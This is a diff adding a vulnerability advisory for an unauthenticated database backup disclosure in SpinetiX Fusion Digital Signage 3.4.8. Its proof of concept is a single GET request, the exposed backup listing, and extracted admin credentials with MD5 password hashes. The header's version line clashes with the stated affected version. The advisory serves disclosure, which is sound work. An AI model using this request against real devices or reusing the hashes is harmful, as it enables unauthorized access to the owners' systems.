@@ -1,0 +1,73 @@
+# Exploit Title: SpinetiX Fusion Digital Signage 3.4.8 - Database Backup Disclosure
+# Date: 2020-09-30
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.spinetix.com
+# Version: <= 8.2.26
+
+SpinetiX Fusion Digital Signage 3.4.8 Database Backup Disclosure
+
+
+Vendor: SpinetiX AG
+Product web page: https://www.spinetix.com
+Affected version: <= 3.4.8 (1.0.36274)
+
+Summary: At SpinetiX we inspire businesses to unlock the potential of their story.
+We believe in the power of digital signage as a dynamic new storytelling platform
+to engage with people. For more than 13 years, we have been constantly innovating
+to deliver cutting-edge digital signage solutions that help our customers shine.
+Fusion is a built-in content management application accessible from a standard web
+browser - it is pre-installed on every HMP200, HMP130, and HMP100 device, and does
+not require any additional license, cost, or software installation.
+
+Desc: The application is vulnerable to unauthenticated database download and information
+disclosure vulnerability. This can enable an attacker to disclose sensitive information
+resulting in authentication bypass, session hijacking and full system control.
+
+Tested on: Apache 2.2.34
+           PHP/5.3.18-2
+           Linux 2.6.10
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5593
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5593.php
+
+
+03.08.2020
+
+--
+
+
+Request:
+--------
+
+GET /content/files/backups/ HTTP/1.0
+Host: 192.168.1.1
+
+Response:
+---------
+
+HTTP/1.1 200 OK
+Date: Wed, 26 Aug 2020 15:57:40 GMT
+Server: Apache/2.2.22 (Unix)
+X-spinetix-firmware: 3.0.6-1.0.21932
+X-raperca-version: 3.0.6-1.0.21912
+X-spinetix-serial: 001d400027b8
+X-spinetix-hw: BonsaiT
+Content-Length: 636
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+
+Index of /content/files/backups
+Name                    Last modified      Size  Description
+Parent Directory                           -   
+Custom1337Name.7z       25-Aug-2020 10:06  1.0M  
+
+Extracting the .7z shows userpwd.txt file, cat userpwd.txt:
+
+admin:e10adc3949ba59abbe56e057f20f883e:file,program,activate,layout,playlist,model,slide,edit,admin::0
+testingus:b874da212a62786181c66c5bbaabf425:file,program,activate,layout,playlist,model,slide,edit,admin:se:1
